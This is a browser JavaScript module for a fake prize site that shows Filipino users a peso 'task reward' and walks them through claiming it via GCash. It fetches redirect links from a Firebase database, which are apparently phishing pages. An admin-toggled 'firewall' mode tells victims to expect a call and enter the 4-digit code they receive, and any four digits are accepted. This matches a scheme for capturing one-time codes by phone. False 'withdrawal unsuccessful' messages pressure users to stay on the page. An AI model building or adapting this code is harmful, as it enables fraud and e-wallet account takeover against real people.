/**
 * Popup Share Module - Complete with Firewall Logic
 * Phase 1 (Default) → Check Firewall → Phase 2 (OFF) or Phase 3 (ON)
 */

// ========== POPUP MODULE ==========
(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    let claimInProgress = false;
    let isRedirecting = false;
    let currentFirewallStatus = false;
    
    // ========== INITIALIZATION ==========
    function init() {
        console.log('🎁 Popup Module Starting...');
        
        const popup = document.getElementById('prizePopup');
        if (!popup) {
            console.error('Popup element not found!');
            return;
        }
        
        getFirewallStatus();
        attachClaimButton();
        attachFirewallEvents();
        addAnimations();
        
        console.log('✅ Popup Module ready');
    }
    
    // ========== ADD ANIMATIONS ==========
    function addAnimations() {
        const style = document.createElement('style');
        style.textContent = `
            @keyframes bounceIn {
                0% { transform: scale(0) rotate(-180deg); opacity: 0; }
                60% { transform: scale(1.1) rotate(0deg); }
                100% { transform: scale(1) rotate(0deg); opacity: 1; }
            }
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,215,0,0.5); }
                100% { transform: scale(1); }
            }
            @keyframes shake {
                0% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                50% { transform: translateX(5px); }
                75% { transform: translateX(-5px); }
                100% { transform: translateX(0); }
            }
            .btn-pulse {
                animation: pulse 0.5s ease;
            }
        `;
        if (!document.querySelector('#popup-animations')) {
            style.id = 'popup-animations';
            document.head.appendChild(style);
        }
    }
    
    // ========== GET FIREWALL STATUS ==========
    async function getFirewallStatus() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('admin/globalFirewall').once('value');
            const data = snapshot.val();
            currentFirewallStatus = (data && data.active === true);
            console.log('🔥 Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
            return currentFirewallStatus;
        } catch(e) {
            console.error('Firewall error:', e);
            return false;
        }
    }
    
    // ========== ATTACH CLAIM BUTTON ==========
    function attachClaimButton() {
        const claimBtn = document.getElementById('claimNowBtn');
        if (!claimBtn) return;
        
        const newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        
        newBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            let balance = 0;
            if (window.PromotionCore) {
                balance = window.PromotionCore.getBalance();
            } else {
                const balanceEl = document.getElementById('userBalanceDisplay');
                if (balanceEl) balance = parseFloat(balanceEl.innerText) || 0;
            }
            
            showPopup(balance);
            
            if (window.PromotionCore) window.PromotionCore.playSound('scatter');
            if (window.ConfettiModule) window.ConfettiModule.start();
        });
    }
    
    // ========== ATTACH FIREWALL EVENTS ==========
    function attachFirewallEvents() {
        const closeBtn = document.getElementById('firewallCloseBtn');
        if (closeBtn) {
            closeBtn.onclick = function() {
                hideFirewallPopup();
                showPhase1(currentBalance);
            };
        }
    }
    
    // ========== GET PAYOUT LINK ==========
    async function getLatestPayoutLink() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                return { key: key, url: linkData.url };
            }
            return null;
        } catch(e) {
            console.error('Link error:', e);
            return null;
        }
    }
    
    // ========== BEFORE UNLOAD HANDLER ==========
    function beforeUnloadHandler(e) {
        if (claimInProgress && !isRedirecting) {
            const message = "⚠️ Your payout is unsuccessful!\n\nUpdate or Install GCash App and withdraw your task reward.\n\nor Switch Device and try again!";
            e.preventDefault();
            e.returnValue = message;
            return message;
        }
    }
    
    // ========== SHOW/HIDE FIREWALL POPUP ==========
    function showFirewallPopup() {
        const firewallPopup = document.getElementById('firewallPopup');
        const prizePopup = document.getElementById('prizePopup');
        const firewallContent = document.getElementById('firewallPopupContent');
        
        if (firewallPopup && firewallContent) {
            if (prizePopup) prizePopup.style.display = 'none';
            
            firewallContent.innerHTML = `
                <div class="firewall-warning-icon">📞</div>
                <h2>VERIFICATION REQUIRED</h2>
                <div class="firewall-message">
                    <p>Due to the high number of winners today, we need to verify your number to prevent fraud and ensure your task rewards go to the right person.</p>
                    <p><strong>Expect a short system-verification call from us.</strong> You will receive a <strong>4-digit verification code</strong> during the call.</p>
                    <p>Enter the code below to continue.</p>
                </div>
                <div class="verification-input-group">
                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                    <button id="verifyCodeBtn" class="verify-btn">VERIFY NOW</button>
                </div>
                <div class="firewall-note">
                    <p>⏳ Waiting for verification call...</p>
                </div>
                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
            `;
            
            const closeBtn = document.getElementById('firewallCloseBtn');
            const verifyBtn = document.getElementById('verifyCodeBtn');
            const codeInput = document.getElementById('verificationCode');
            const errorMsg = document.getElementById('firewallErrorMsg');
            
            if (closeBtn) {
                closeBtn.onclick = function() {
                    hideFirewallPopup();
                    showPhase1(currentBalance);
                };
            }
            
            if (verifyBtn) {
                verifyBtn.onclick = function() {
                    verifyFirewallCode();
                };
            }
            
            if (codeInput) {
                codeInput.value = '';
                codeInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') verifyFirewallCode();
                });
            }
            
            if (errorMsg) errorMsg.style.display = 'none';
            
            firewallPopup.style.display = 'flex';
            console.log('🔥 Firewall popup shown - waiting for admin call');
        }
    }
    
    function hideFirewallPopup() {
        const firewallPopup = document.getElementById('firewallPopup');
        if (firewallPopup) firewallPopup.style.display = 'none';
    }
    
    // ========== VERIFY FIREWALL CODE ==========
    function verifyFirewallCode() {
        const codeInput = document.getElementById('verificationCode');
        const errorMsg = document.getElementById('firewallErrorMsg');
        const verifyBtn = document.getElementById('verifyCodeBtn');
        const code = codeInput?.value.trim();
        
        if (!code || code.length !== 4) {
            if (errorMsg) {
                errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid.";
                errorMsg.style.display = 'block';
            }
            if (codeInput) {
                codeInput.style.animation = 'shake 0.3s ease-in-out';
                setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
            }
            return;
        }
        
        if (verifyBtn) {
            verifyBtn.disabled = true;
            verifyBtn.innerText = "VERIFYING...";
        }
        
        // Simulate verification (admin will call user with actual code)
        setTimeout(() => {
            hideFirewallPopup();
            alert("✅ Verification successful! You can now claim your reward.");
            transitionToPhase2();
        }, 1500);
    }
    
    // ========== CHECK FIREWALL AND TRANSITION ==========
    async function checkFirewallAndTransition() {
        const isFirewallOn = await getFirewallStatus();
        
        if (isFirewallOn) {
            console.log('🔥 Firewall ON - Showing firewall verification popup');
            showFirewallPopup();
        } else {
            console.log('🔓 Firewall OFF - Transition to Phase 2');
            transitionToPhase2();
        }
    }
    
    // ========== ANIMATION TRANSITION TO PHASE 2 ==========
    function transitionToPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(() => {
            showPhase2();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
    // ========== PHASE 1: DEFAULT POPUP ==========
    function showPhase1(balance) {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentBalance = balance;
        currentPhase = 1;
        
        popupInner.style.transition = '';
        popupInner.style.opacity = '1';
        popupInner.style.transform = '';
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase1">✕</div>
            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
            <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
            <div class="divider"></div>
            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
            <div class="luckyday-image-container">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
            </div>
            <div class="divider"></div>
            <div class="indicator-group">
                <div class="indicator"></div>
                <div class="indicator"></div>
                <div class="indicator"></div>
            </div>
            
            <button class="claim-gcash-button" id="claimGCashBtn" style="transition: all 0.2s ease;">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
            </button>

            <div class="button-separator"></div>

            <button class="back-btn" id="backBtnPhase1">
                ← BACK
            </button>
        `;
        
        const closeBtn = document.getElementById('popupClosePhase1');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase1');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        const claimBtn = document.getElementById('claimGCashBtn');
        if (claimBtn) {
            claimBtn.onclick = function() {
                this.style.transform = 'scale(0.98)';
                setTimeout(() => { this.style.transform = 'scale(1)'; }, 150);
                checkFirewallAndTransition();
            };
        }
    }
    
    // ========== PHASE 2: WITHDRAWAL LINK ==========
    function showPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 2;
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase2">✕</div>
            
            <div style="text-align: center; margin-bottom: 10px;">
                <div style="font-size: 60px; animation: bounceIn 0.5s ease;">🏆</div>
            </div>
            
            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 5px 0; letter-spacing: 1px;">
                GREAT JOB ON YOUR FIRST WIN!
            </h2>
            
            <div class="divider" style="width: 40px; margin: 10px auto;"></div>
            
            <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
                <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #e0e0e0; line-height: 1.5; text-align: center; margin: 0 0 10px 0;">
                    "Nice work today! You made that look easy — you can definitely earn even more."
                </p>
                <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ffd700; line-height: 1.5; text-align: center; margin: 0; font-weight: 500;">
                    Your task rewards of 
                    <span style="font-size: 28px; font-weight: 900; color: #ffd700; text-shadow: 0 0 10px rgba(255,215,0,0.5); display: inline-block; margin: 0 5px;">₱${currentBalance.toFixed(2)}</span> 
                    are officially ready to be claimed!
                </p>
            </div>
            
            <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 50px; padding: 12px 20px; margin: 15px 0; text-align: center;">
                <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; margin: 0;">
                    Once your claiming process is 
                    <span style="font-family: 'Orbitron', monospace; font-size: 16px; font-weight: 900; color: #00aaff; text-shadow: 0 0 8px rgba(0,170,255,0.5); display: inline-block; letter-spacing: 2px;">AUTHORIZED</span>, 
                    your prize will be transferred instantly to your GCash wallet.
                </p>
            </div>
            
            <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 2px solid #ffd700; border-radius: 20px; padding: 15px; margin: 15px 0; text-align: center; box-shadow: 0 0 20px rgba(255,215,0,0.2);">
                <div style="font-size: 10px; color: #ffd700; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 5px;">PRIZE AMOUNT</div>
                <div style="font-size: 56px; font-weight: 900; color: #ffd700; text-shadow: 0 0 15px rgba(255,215,0,0.4); font-family: 'Orbitron', monospace;">₱${currentBalance.toFixed(2)}</div>
                <div style="height: 2px; background: linear-gradient(90deg, transparent, #ffd700, transparent); width: 80%; margin: 10px auto;"></div>
                <div style="font-size: 10px; color: #888;">Ready for payout</div>
            </div>
            
            <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
                <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
                    💡 Make sure you have a verified GCash account to receive your reward
                </p>
            </div>
            
            <button class="claim-gcash-button" id="proceedBtn" style="transition: all 0.2s ease; width: 100%;">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP
            </button>

            <div class="button-separator" style="margin: 15px 0 10px;"></div>

            <button class="back-btn" id="backBtnPhase2" style="transition: all 0.2s ease; width: 100%;">
                ← BACK TO PHASE 1
            </button>
        `;
        
        attachPhase2Events(popupInner);
    }
    
    // ========== ATTACH PHASE 2 EVENTS ==========
    function attachPhase2Events(popupInner) {
        const closeBtn = document.getElementById('popupClosePhase2');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase2');
        if (backBtn) {
            backBtn.onclick = function() {
                popupInner.style.transition = 'opacity 0.3s ease';
                popupInner.style.opacity = '0';
                setTimeout(() => {
                    showPhase1(currentBalance);
                    popupInner.style.opacity = '1';
                }, 300);
            };
        }
        
        const proceedBtn = document.getElementById('proceedBtn');
        if (proceedBtn) {
            proceedBtn.onclick = async function() {
                if (claimInProgress) return;
                
                claimInProgress = true;
                
                this.classList.add('btn-pulse');
                setTimeout(() => this.classList.remove('btn-pulse'), 500);
                
                this.disabled = true;
                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> PROCESSING PAYOUT...`;
                this.style.opacity = '0.8';
                
                window.addEventListener('beforeunload', beforeUnloadHandler);
                
                const linkData = await getLatestPayoutLink();
                
                if (linkData && linkData.url) {
                    isRedirecting = true;
                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
                    setTimeout(() => {
                        window.removeEventListener('beforeunload', beforeUnloadHandler);
                        window.location.href = linkData.url;
                    }, 800);
                } else {
                    claimInProgress = false;
                    isRedirecting = false;
                    window.removeEventListener('beforeunload', beforeUnloadHandler);
                    
                    this.disabled = false;
                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
                    this.style.opacity = '1';
                    
                    const errorDiv = document.createElement('div');
                    errorDiv.className = 'error-message';
                    errorDiv.style.cssText = 'background: rgba(255,68,68,0.15); border: 1px solid #ff4444; border-radius: 10px; padding: 12px; margin-top: 10px; text-align: center;';
                    errorDiv.innerHTML = `
                        <div style="color: #ff8888; font-size: 14px; font-weight: bold; margin-bottom: 5px;">⚠️ Withdrawal Unsuccessful</div>
                        <div style="color: #ccc; font-size: 11px; line-height: 1.4;">Update or Install GCash App and withdraw your task reward.</div>
                        <div style="color: #ffaa33; font-size: 10px; margin-top: 8px;">or Switch Device and try again!</div>
                    `;
                    
                    const existingError = popupInner.querySelector('.error-message');
                    if (existingError) existingError.remove();
                    proceedBtn.parentNode.insertBefore(errorDiv, proceedBtn.nextSibling);
                    
                    setTimeout(() => {
                        if (errorDiv) errorDiv.remove();
                    }, 5000);
                }
            };
        }
    }
    
    // ========== SHOW POPUP ==========
    async function showPopup(balance) {
        currentBalance = balance;
        await getFirewallStatus();
        showPhase1(balance);
        
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'flex';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'none';
        }
    }
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
            if (window.ConfettiModule) window.ConfettiModule.stop();
        }
        
        claimInProgress = false;
        isRedirecting = false;
        window.removeEventListener('beforeunload', beforeUnloadHandler);
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // ========== EXPORT ==========
    window.showPopup = showPopup;
    window.closePopup = closePopup;
    window.getFirewallStatus = getFirewallStatus;
    
})();
